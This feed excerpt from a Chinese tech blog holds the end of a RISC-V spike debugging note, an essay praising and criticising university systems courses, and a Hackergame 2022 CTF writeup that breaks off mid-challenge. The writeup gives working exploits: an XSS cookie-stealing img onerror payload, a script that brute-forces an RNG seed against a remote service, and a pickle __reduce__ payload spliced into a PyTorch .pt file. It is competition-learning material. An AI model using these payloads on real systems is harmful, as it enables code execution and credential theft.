<span class="number">0</span>);</span><br><span class="line">    state-&gt;mip-&gt;<span class="built_in">backdoor_write_with_mask</span>(mask, mip_val);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这个 sync 实际上就是在启用 sstc 的时候检测是否根据 stimecmp 触发时钟中断。spike 上启用 sstc 需要自己设定 isa，即加一个 <code>--isa=RV64gc_zicntr_sstc</code>，然后在 GDB 调试的时候 <code>i r stimecmp</code> 就能查看到 stimecmp 的值了（qemu 甚至不让看 stimecmp）。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://openocd.org/doc/html/">https://openocd.org/doc/html/</a></li><li><a href="https://tinylab.org/riscv-semihosting/">https://tinylab.org/riscv-semihosting/</a></li><li><a href="https://blog.csdn.net/luolaihua2018/article/details/127344891">https://blog.csdn.net/luolaihua2018/article/details/127344891</a></li><li><a href="https://zhuanlan.zhihu.com/p/506062424">https://zhuanlan.zhihu.com/p/506062424</a></li></ul><p>本文中出现源码的版本：</p><ul><li>opensbi: c4940a9517486413cd676fc8032bb55f9d4e2778</li><li>riscv-isa-sim: 0cc5ecce053c6dfa44e4a865d2838fc8d7d771dc</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;想探索一下在 OS 课上写一个指导来让同学们可以像系统一样选择 &lt;a href=&quot;https://github.com/riscv-software-src/riscv-isa-sim/&quot;&gt;spike&lt;/a&gt; 来进行 RISC-V kernel 调试。当时系统三助教的时候用过，但是 spike 是学长改过的 &lt;a href=&quot;https://github.com/sycuricon/riscv-isa-cosim&quot;&gt;riscv-isa-cosim&lt;/a&gt;（加了 CJ 也就是 difftest 的部分），这个目前已经有段时间没更新了，所以在尝试使用最新版本 OpenSBI（启用 PIE 编译）的时候无法加载 ELF（还不支持 PIE），于是就更换成了最新的 spike，然后就有了以下的调试过程。&lt;/p&gt;</summary>
    
    
    
    <category term="RISC-V" scheme="https://blog.tonycrane.cc/categories/RISC-V/"/>
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/categories/RISC-V/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="RISC-V" scheme="https://blog.tonycrane.cc/tags/RISC-V/"/>
    
    <category term="spike" scheme="https://blog.tonycrane.cc/tags/spike/"/>
    
    <category term="学习" scheme="https://blog.tonycrane.cc/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>「杂谈」由 PA 实验引发的一些思考</title>
    <link href="https://blog.tonycrane.cc/p/dc8d460.html"/>
    <id>https://blog.tonycrane.cc/p/dc8d460.html</id>
    <published>2023-02-01T16:37:23.000Z</published>
    <updated>2024-08-05T13:52:34.691Z</updated>
    
    <content type="html"><![CDATA[<p>最近刚刚刷完南京大学 ICS 的 PA 实验，很有感触。</p><p>这篇是做完 PA 那天的大半夜一点多写出来的，深夜发电，说的话图一乐，记录一下罢了。</p><p>实验中学到的东西和一些 debug 经历我放在了 note 里面：<a href="https://note.tonycrane.cc/cs/system/pa/">南京大学 ICS PA 实验纪实</a>。</p><span id="more"></span><h2 id="关于实验"><a href="#关于实验" class="headerlink" title="关于实验"></a>关于实验</h2><p>虽然才上大学一年半，专业课也没有很多，但也有几门课是带实验的。虽然说我现在的理解可能还不到位，但还是来记录一下我现在的想法。</p><p>这一年半可以算得上实验的大概有大一春夏的系统一，暑假小学期的超算，大二秋冬的系统二、AI 基础。其他的大作业像程算的并行排序，汇编的四次作业，网安导的课程论文，数据结构的 project 或许也可以算上。</p><p>PA 的实验手册是我做过的这些所有实验都完全无法比拟的。PA 中既有对于知识点的讲解，落实在实验框架的具体体现，又清晰地在每一阶段叙述了当前的目的是什么、为了达到这个目的需要做些什么、做的时候需要注意什么等等。而且所有实验贯通在一起，让人完成之后巨有成就感。</p><p>PA 实验满足了我对计算机类实验的所有设想：</p><ul><li>能学到理论知识</li><li>有明确的目标和指导</li><li>能亲手完成大部分代码来印证理论知识，达成目标</li><li>能在实验过程中有更多额外收获</li><li>实验负担不重，做起来舒适</li><li>能让人很有成就感</li></ul><p>说起来系统实验我觉得也达到了这些目标，那我认为系统相比于 PA 差在哪里了呢，还是放在下一部分来说罢。</p><p>而其他的实验则都差了那么一点，超算负担重而且指导不多，做起来有些烦躁闹心。超算的并行排序几乎没有什么指导，全靠自己查资料，最后也是勉强完成。汇编大作业也是负担太重，而且基本就是颅内编译 C 代码，要说学到什么吧……好像那么几条指令不用做这些作业也能理解。</p><p>除此之外之前看了点 rCore，反正最开始是给了我一种无处下手的感觉，然后就先放在一边了。</p><p>哦？你说 AI 基础的实验我怎么没提？呵，纯纯的一坨答辩，要啥啥没有就是了。</p><h2 id="关于系统贯通"><a href="#关于系统贯通" class="headerlink" title="关于系统贯通"></a>关于系统贯通</h2><p>再来说一说系统贯通，这个名词其实就是信安课改成果系统一二三的全称，其目标大概就是将计算机系统软硬件的教学和实验从头到尾贯通起来，正是如此它取代了原有的计算机逻辑设计基础、计算机组成原理、计算机体系结构、操作系统四门课。宣传的课程目标也是从晶体管、逻辑门开始学起，到数字逻辑电路，到实现单周期 CPU、流水线 CPU、再到在自己实现的 CPU 上运行自己编写的操作系统。</p><p>就我目前上过的系统一二而言，确实可以看到各位老师的用心，也确实在按照这个目标努力地将各个部分串联起来。这也是我这一年半来体验最好，而且是每周最期待的课程。对同学、学弟甚至是外校的好朋友我也经常提起、夸奖这系列课程。</p><p>不过这个假期我一拍脑袋决定玩一下别人也常对我提起的系统实验，那就是这个 PA。随着 PA 逐步进行，我也越来越感受到了整个系统确确实实在这套实验中被贯通了起来。<br>从最底层开始，有 NEMU 模拟器来模拟 CPU 的工作；再向上有一层 AbstractMachine 将硬件提供的机制抽象起来，分为了五组 API 来供上层使用；它的上层是 NanOS（PA 中是 lite 版本），一个利用这些 API 实现的操作系统；在此基础上有一套 Navy-apps 框架用来编译出可以方便运行在系统上的程序。</p><p>而这些内容并不是完全由实验提供，而是各个部件都留出了大量关键的空白来由学生自己实现。而实验文档也逐层递进，一步一步引导学生来完成这个看似复杂无比的任务。</p><p>最终的效果便是，从最底层的 CPU 取指、译码、执行，到 I/O 设备通信、中断处理、上下文管理、虚拟内存管理，再到操作系统的进程维护与调度、虚拟内存分配、应用程序加载、系统调用实现，甚至再到上层应用的各类库例如 NDL SDL 的实现，全部都是由学生来理解自行完成的。</p><p>实验手册逐步推进，一点一点地看透庞大代码中的每一处细节，了解各层之间的协调运行，理解整个系统运转的原理。这才是我认为真正完美的系统贯通。</p><p>而说回来我校的系统实验，优点是它完美地伴随了理论课的内容，达到了在实验中理解理论、动手实现的目标。而缺点也伴随而来，就是同理论课一样，还是存在着明显的割裂感。讲数字电路时实验就是模拟电路，讲硬件系统时实验就是写 CPU，讲操作系统时就是编写系统放在 qemu 上运行。而系统二最后一个实验也就是所谓的软硬件综合实验也无非是将一堆 riscv 指令丢到 CPU 的 ROM 里去跑，甚至这一堆指令还是给定的简化后的系统，而并不是自己编译出来的。</p><p>所以说虽然相对而言，这些实验让我做的很有目的，知道自己在干什么，而且在实验的同时也能学到很多东西。但是如果把要求放的更严格一点，这些实验距离“系统贯通”的这一目标还是有一段距离的。</p><p>可能是没有稳定、可以持续一年半，而且有想法有实力的助教团队。也可能是系统课程才开办第二届，各类设施还不完善。也可能是同学畏难心理压迫实验难度下调不易贯通。总而言之系统这系列课的水平还可以提升的更高。而且如果将来我有幸可以投身于这门课的设计当中，我肯定也会努力将各个部分贯通起来，因为在我看来这真的是一件很酷的事情。</p><p>所以还是希望系统这门课可以越办越好吧！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后话再说回来，系统可是我整个大学到现在最喜欢最满意的一门课了。再反观其他的课程，被系统平替的四门课程就不必说了，本身就很割裂，老师也不连贯，助教也不连贯，甚至同一学期同一课程的不同教学班之间都差别很大，实验也是部分意义不大的面向得分的实验，甚至据学长说硬件实验可以说是 verilog 程序填空（系统的硬件实验的 CPU 是除了交互的外壳以外完全没有代码框架的）。</p><p>AI 基础实验更是重量级，前面的都有明确的目标，而 AI 基础连要我干什么都讲不清楚。比如有一个实验，原理部分白话一大堆，深奥的理论讲了一大堆，最后一看代码，所有东西都已经写好了，思来想去，又是和同学交流，最后猜出的结论是实验目标就是调一下几个参数。咱就是想问一下，这样的实验能学到什么吗，纯粹的浪费时间。</p><p>超算的实验还是不错的，毕竟是全由超算队同学来设计，整门课程就是实验为主体的小学期课程。确实学到了很多，我也比较满意，虽说体验上不如系统，但是和上面这些烂课放一起还是不公平的（x）要说缺点嘛，大概就是太难了，手册说了很多理论，到最后动手优化完全不知道怎么写，糊一糊勉强优化了就交上去，体验和成就感是没有那么强的。</p><p>看着自己学校这种烂专业课横行，反馈下来删又删不掉，改又改不动，真的是有一种说不上来的滋味。</p><p>或许我可能也像各位学长一样，开始对浙大甚至国内的计算机教育逐步失去信心。</p><p>或许系统这门课在浙大诞生就是一个奇迹。</p><p>我真的希望浙大可以有团队来精心打造，产出更多像 PA、系统贯通这样的优质课程。</p><p>而做不出更多这样的好课的原因到底差在哪呢，差在能力上吗？或许只是缺少这种大规模课改的动力和勇气罢了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近刚刚刷完南京大学 ICS 的 PA 实验，很有感触。&lt;/p&gt;
&lt;p&gt;这篇是做完 PA 那天的大半夜一点多写出来的，深夜发电，说的话图一乐，记录一下罢了。&lt;/p&gt;
&lt;p&gt;实验中学到的东西和一些 debug 经历我放在了 note 里面：&lt;a href=&quot;https://note.tonycrane.cc/cs/system/pa/&quot;&gt;南京大学 ICS PA 实验纪实&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://blog.tonycrane.cc/categories/%E6%9D%82%E8%B0%88/"/>
    
    <category term="学习" scheme="https://blog.tonycrane.cc/categories/%E6%9D%82%E8%B0%88/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://blog.tonycrane.cc/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="杂谈" scheme="https://blog.tonycrane.cc/tags/%E6%9D%82%E8%B0%88/"/>
    
    <category term="随笔" scheme="https://blog.tonycrane.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2022」#3 Writup 囤囤囤 1</title>
    <link href="https://blog.tonycrane.cc/p/169d9f3d.html"/>
    <id>https://blog.tonycrane.cc/p/169d9f3d.html</id>
    <published>2022-10-26T21:18:19.000Z</published>
    <updated>2022-10-30T14:14:49.682Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/4fd94ed.html">&lt; #2</a></p><p><a href="/p/a86683c.html">#4 &gt;</a></p></div><p>这篇 Writeup 写一下 Hackergame 2022 里刚囤 flag 时做的剩下一部分题：<br>微积分计算小练习、蒙特卡罗轮盘赌、二次元神经网络、光与影、片上系统、企鹅拼盘、火眼金睛的小 E</p><span id="more"></span><hr><h2 id="微积分计算小练习"><a href="#微积分计算小练习" class="headerlink" title="微积分计算小练习"></a>微积分计算小练习</h2><blockquote><p>小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。</p><p>点击此链接访问练习网站（没链接）</p><p>想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。</p><p>总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：</p><p>点击此链接提交练习成绩 URL（没链接）</p></blockquote><p>点进第一个链接，随便做一遍，得到成绩分享页面 <code>/share?result=...</code>，然后将链接贴到第二个链接里，会自动读取出名字和成绩。</p><p>读取的过程是用 selenium 打开一个浏览器，GET login 然后将 flag 放入 cookie，在 GET 输入的 url（会替换掉 netloc 为 web，scheme 为 http），然后读取 #greeting 和 #score 的内容。</p><p>再看第一个链接，其 result 是可以构造的，相关逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> queryString = <span class="built_in">window</span>.location.search;</span><br><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> URLSearchParams(queryString);</span><br><span class="line"><span class="keyword">const</span> result = urlParams.get(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> b64decode = atob(result);</span><br><span class="line"><span class="keyword">const</span> colon = b64decode.indexOf(<span class="string">&quot;:&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> score = b64decode.substring(<span class="number">0</span>, colon);</span><br><span class="line"><span class="keyword">const</span> username = b64decode.substring(colon + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&quot;#greeting&quot;</span>).innerHTML = <span class="string">&quot;您好，&quot;</span> + username + <span class="string">&quot;！&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&quot;#score&quot;</span>).innerHTML = <span class="string">&quot;您在练习中获得的分数为 &lt;b&gt;&quot;</span> + score + <span class="string">&quot;&lt;/b&gt;/100。&quot;</span>;</span><br></pre></td></tr></table></figure><p>也就是将 result base64 解码，: 前面的为分数，后面的为用户名，然后填写进去。这里就可以进行 xss。没学过 xss，所以想了半天插入一个 script tag 之后怎么让处在前面的它被运行，后来搜了搜才知道可以利用 onload onerror 这些事件来填写脚本。</p><p>所以 payload 就是 <code>100:&lt;img src=1 onerror=&quot;document.querySelector(&#39;#greeting&#39;).innerHTML=document.cookie&quot;&gt;</code>，然后 base64 后作为 result 传入，再丢给第二个提交链接，得到 flag：<strong>flag{xS5_1OI_is_N0t_SOHARD_3c97784c1a}</strong></p><hr><h2 id="蒙特卡罗轮盘赌"><a href="#蒙特卡罗轮盘赌" class="headerlink" title="蒙特卡罗轮盘赌"></a>蒙特卡罗轮盘赌</h2><blockquote><p>这个估算圆周率的经典算法你一定听说过：往一个 1x1 大小的方格里随机撒 N 个点，统计落在以方格某个顶点为圆心、1 为半径的 1/4 扇形区域中撒落的点数为 M，那么 M/N 就将接近于 π/4 。</p><p>当然，这是一个概率性算法，如果想得到更精确的值，就需要撒更多的点。由于撒点是随机的，自然也无法预测某次撒点实验得到的结果到底是多少——但真的是这样吗？</p><p>有位好事之徒决定借此和你来一场轮盘赌：撒 40 万个点计算圆周率，而你需要猜测实验的结果精确到小数点后五位。为了防止运气太好碰巧猜中，你们约定五局三胜。</p></blockquote><p>看起来没什么其它漏洞，从伪随机入手，设置的随机种子为 time(0)+clock()，也就是当前时间戳加上程序运行到此处的 ticks 数。时间戳以秒为单位，波动不大，直接使用连接时的时间戳就可以。clock() 会有较大波动，从 0 开始枚举，将得到的值传入一个 C 程序中作为随机种子，模拟一下，看一看前两个是否能和正确结果对上。能对上则说明随机种子找对了，将后三个结果输回去即可完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./challenge&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;202.38.93.111&quot;</span>, <span class="number">10091</span>)</span><br><span class="line">token = <span class="string">&quot;...&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;: &quot;</span>, token.encode())</span><br><span class="line">timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_seed</span>(<span class="params">res1, res2</span>):</span></span><br><span class="line">    <span class="keyword">for</span> clock <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9000</span>)):</span><br><span class="line">        seed = timestamp + clock</span><br><span class="line">        cracker = subprocess.run(</span><br><span class="line">            [<span class="string">&quot;./exp&quot;</span>, <span class="built_in">str</span>(seed)],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">        )</span><br><span class="line">        res = cracker.stdout.decode().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="built_in">str</span>(res1) <span class="keyword">and</span> res[<span class="number">1</span>] == <span class="built_in">str</span>(res2):</span><br><span class="line">            <span class="built_in">print</span>(seed)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        seed = timestamp - clock</span><br><span class="line">        cracker = subprocess.run(</span><br><span class="line">            [<span class="string">&quot;./exp&quot;</span>, <span class="built_in">str</span>(seed)],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">        )</span><br><span class="line">        res = cracker.stdout.decode().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="built_in">str</span>(res1) <span class="keyword">and</span> res[<span class="number">1</span>] == <span class="built_in">str</span>(res2):</span><br><span class="line">            <span class="built_in">print</span>(seed)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3.14159&#x27;</span>)</span><br><span class="line">win = p.recvline().decode().strip()</span><br><span class="line"><span class="keyword">if</span> win == <span class="string">&quot;猜对了！&quot;</span>:</span><br><span class="line">    res1 = <span class="string">&quot;3.14159&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    res1 = p.recvline().decode().strip()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3.14159&#x27;</span>)</span><br><span class="line">win = p.recvline().decode().strip()</span><br><span class="line"><span class="keyword">if</span> win == <span class="string">&quot;猜对了！&quot;</span>:</span><br><span class="line">    res2 = <span class="string">&quot;3.14159&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    res2 = p.recvline().decode().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line">res = crack_seed(res1, res2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.sendline(res[<span class="number">2</span>].encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.sendline(res[<span class="number">3</span>].encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;：&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.sendline(res[<span class="number">4</span>].encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行得到 flag：<strong>flag{raNd0m_nUmb34_a1wayS_m4tters_……}</strong></p><p>哦对了，有一个很坑的点是 mac 上的 gcc 其实是 clang 的 alias，而 clang 和 gcc 的随机数有区别，在 mac 上跑的话就一直爆不出来种子。在 Linux 上就可以一下爆出来。</p><hr><h2 id="二次元神经网络"><a href="#二次元神经网络" class="headerlink" title="二次元神经网络"></a>二次元神经网络</h2><blockquote><p>天冷极了，下着雪，又快黑了。这是一年的最后一天——大年夜。在这又冷又黑的晚上，一个没有 GPU、没有 TPU 的小女孩，在街上缓缓地走着。她从家里出来的时候还带着捡垃圾捡来的 E3 处理器，但是有什么用呢？跑不动 Stable Diffusion，也跑不动 NovelAI。她也想用自己的处理器训练一个神经网络，生成一些二次元的图片。</p><p>于是她配置好了 PyTorch 1.9.1，定义了一个极其简单的模型，用自己收集的 10 张二次元图片和对应的标签开始了训练。</p><p>她在 CPU 上开始了第一个 epoch 的训练，loss 一直在下降，许多二次元图片重叠在一起，在向她眨眼睛。</p><p>她又开始了第二个 epoch，loss 越来越低，图片越来越精美，她的眼睛也越来越累，她的眼睛开始闭上了。</p><p>…</p><p>第二天清晨，这个小女孩坐在墙角里，两腮通红，嘴上带着微笑。新年的太阳升起来了，照在她小小的尸体上。</p><p>人们发现她时才知道，她的模型在 10 张图片上过拟合了，几乎没有误差。</p><p>（完）</p><p>听完这个故事，你一脸的不相信：「这么简单的模型怎么可能没有误差呢？」，于是你开始复现这个二次元神经网络。</p></blockquote><p>目标看起来就是让模型生成的图片和预期几乎没有误差。试着多训练几轮，试图过拟合，记录一下 loss，发现降到 0.001+ 的时候就降不下去了，而需要的是 0.0005<br><img src="/p/169d9f3d/loss.png"></p><p>看起来不可行。而且这是一道 web 类题，考虑用一些手段来让它认为我的输出是完全正确的。</p><p>搜索可以发现存的 .pt 文件中有使用 pickle 序列化存储的 .pkl 文件。而在读取的时候也会进行反序列化，这也就存在一个 pickle 反序列化的漏洞。</p><p>我们可以自己写一个恶意类然后打包到 data.pkl 压缩进 .pt 文件，在反序列化的时候就会执行其中的代码，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;...&quot;</span>, ))</span><br></pre></td></tr></table></figure><p>这个在本地测试的时候运行 infer.py 可以打通，但远程就不可以。所以可以猜测远程实际上从其它模块中调用了 infer 函数，如果没有正常返回，则会报错。</p><p>那么我们的思路就是让整个程序都可以正常运行，只是在反序列化的时候进行一些操作。根据源码可以知道最终会将模型输出的结果存放在 /tmp/result.json 中，然后在其它位置再读取这个文件，进行判断。而如果没有这个文件则会直接报错。</p><p>所以可以在 reduce 中将完全正确的结果先写入 /tmp/result.json 中。但如果这时直接 exit，则后面程序无法执行，会出现报错。所以还需要让后面完全正常运行。整个 infer 函数的逻辑大概如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">pt_file</span>):</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)</span><br><span class="line">    model.load_state_dict(torch.load(pt_file, map_location=<span class="string">&quot;cpu&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ... predict</span></span><br><span class="line"></span><br><span class="line">    json.dump(&#123;<span class="string">&quot;gen_imgs_b64&quot;</span>: gen_imgs&#125;, <span class="built_in">open</span>(<span class="string">&quot;/tmp/result.json&quot;</span>, <span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><p>我们输入的 pt 文件会在 torch.load 中进行反序列化，这时会写入 /tmp/result.json。而后面对于我们写入的威胁就是还会 json.dump 一次。所以首先需要将 json.dump 这个函数的作用抹除掉：<code>__import__(&#39;json&#39;).dump=lambda x, y: 0</code>。但这还不够，因为参数中的 open 也会执行，以 w 方式打开文件的话会先直接清空文件，所以也需要抹掉 open 的作用。不过后面肯定还会需要使用 open 来读取文件，所以只能抹掉写入的部分：<code>__builtins__[&#39;_open&#39;] = open; __builtins__[&#39;open&#39;]=lambda x, y: 0 if y==&#39;w&#39; else __builtins__[&#39;_open&#39;](x, y)</code>。</p><p>这样来讲我们的 exp 就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        text = <span class="string">&#x27;&#123;&quot;gen_imgs_b64&quot;: [&quot;......&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">f&quot;open(&#x27;/tmp/result.json&#x27;, &#x27;w&#x27;).write(&#x27;<span class="subst">&#123;text&#125;</span>&#x27;);&quot;</span></span><br><span class="line">            <span class="string">&quot;__import__(&#x27;json&#x27;).dump=lambda x, y: 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;__builtins__[&#x27;_open&#x27;]=open;&quot;</span></span><br><span class="line">            <span class="string">&quot;__builtins__[&#x27;open&#x27;]=lambda x, y: 0 if y==&#x27;w&#x27; else __builtins__[&#x27;_open&#x27;](x, y)&quot;</span>, ))</span><br></pre></td></tr></table></figure><p>但仅将这个打包后得到的 data.pkl 直接压缩进 pt 文件还是不行。因为模型就没法正常读取了，所以还需要对其进行一些修改。</p><p>pkl 文件实际存储的是一个构造好的虚拟机指令，pickle 反序列化时会执行它。看源码可以了解到有一个指令 0x2E 表示了结束返回。所以直接将生成的 data.pkl 末尾的 0x2E 去掉，然后直接接上一份正确的 data.pkl 内容即可完成构造。</p><p>构造好后上传 pt 文件，即可达到目标得到 flag：<strong>flag{Torch.Load.Is.Dangerous-……}</strong></p><hr><h2 id="光与影"><a href="#光与影" class="headerlink" title="光与影"></a>光与影</h2><blockquote><p>冒险，就要不断向前！</p><p>在寂静的神秘星球上，继续前进，探寻 flag 的奥秘吧！</p></blockquote><p>打开发现是一个 WebGL 渲染的场景，其中 flag 的内容被挡住了。所有内容都是在前端的，存下来就可以本地调试。</p><p>发现其中的主要场景渲染代码都在 fragment-shader.js 中。可以发现由一些 sdf 组成，最终的场景也是由几个 sdf 结果取 min 而来的。</p><p>看起来 t5SDF 的代码最短，可能是施加的遮盖。所以将 sceneSDF 中 t5 相关的部分删掉，再打开页面运行即可看到完整 flag：<strong>flag{SDF-i3-FuN!}</strong></p><p><img src="/p/169d9f3d/sdf.png"></p><hr><h2 id="片上系统"><a href="#片上系统" class="headerlink" title="片上系统"></a>片上系统</h2><blockquote><p>最近，你听说室友在 SD 卡方面取得了些进展。在他日复一日的自言自语中，你逐渐了解到这个由他一个人自主研发的片上系统现在已经可以从 SD 卡启动：先由“片上 ROM 中的固件”加载并运行 SD 卡第一个扇区中的“引导程序”，之后由这个“引导程序”从 SD 卡中加载“操作系统”。而这个“操作系统”目前能做的只是向“串口”输出一些字符。</p><p>同时你听说，这个并不完善的 SD 卡驱动只使用了 SD 卡的 SPI 模式，而传输速度也是低得感人。此时你突然想到：如果速度不快的话，是不是可以用逻辑分析仪来采集（偷窃）这个 SD 卡的信号，从而“获得” SD 卡以至于这个“操作系统”的秘密？</p><p>你从抽屉角落掏出吃灰已久的逻辑分析仪。这个小东西价格不到 50 块钱，采样率也只有 24 M。你打开 PulseView，把采样率调高，连上室友开发板上 SD 卡的引脚，然后接通了开发板的电源，希望这聊胜于无的分析仪真的能抓到点什么有意思的信号。至于你为什么没有直接把 SD 卡拿下来读取数据，就没人知道了。</p><p><strong>引导扇区</strong></p><p>听说，第一个 flag 藏在 SD 